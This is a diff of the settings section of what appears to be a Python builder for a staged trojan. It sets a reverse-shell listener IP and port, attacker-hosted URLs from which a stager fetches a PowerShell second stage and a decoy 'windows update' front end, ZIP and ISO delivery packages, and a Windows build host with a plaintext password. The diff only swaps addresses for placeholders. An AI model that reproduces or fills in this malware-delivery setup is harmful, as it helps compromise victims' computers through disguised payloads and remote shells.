@@ -49,15 +49,15 @@ except ImportError:
 # ==============================================================================
 # VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
 # ==============================================================================
-# IP and port on which the listener is listening
-LHOST        = "151.67.18.144"
+# IP Public and port on which the listener is listening
+LHOST        = "151.61.61.61"
 LPORT        = "21"
 
 # Host from which stager (STAGERNAME) download second stage (SECONDNAME)
-ATTACKER_URL = "https://raw.githubusercontent.com/dok72/dok72.github.io/main/soloemapuoaccedere"
+ATTACKER_URL = "https://raw.githubusercontent.com/test/test.github.io/main/download"
 
 # Host from which trojan download stager (STAGERNAME) and front end file (e.g. windows update - TROJAN-FE)
-TROJAN_URL   = "https://raw.githubusercontent.com/dok72/dok72.github.io/main/soloemapuoaccedere"
+TROJAN_URL   = "https://raw.githubusercontent.com/test/test.github.io/main/download"
 
 # File name
 SECONDNAME   = "second.txt"              # second stage (PS1)
@@ -77,7 +77,7 @@ ZIPNAME      = "05.LAUNCHER-STAGER.zip"  # contains launcher + stager.exe (which
 ISONAME      = "06.LAUCHER-TROJAN.iso"   # contains launcher + trojan (which calls stager, which calls secondStage via the web + if all goes well, also calls the FE file)
 
 # IP, User and Pass to connect to in order to perform the ISO to EXE conversion operation
-WIN_IP       = "192.168.1.111"
+WIN_IP       = "192.168.1.5"
 WIN_USER     = "ieuser"
 WIN_PASS     = "Passw0rd!"
 
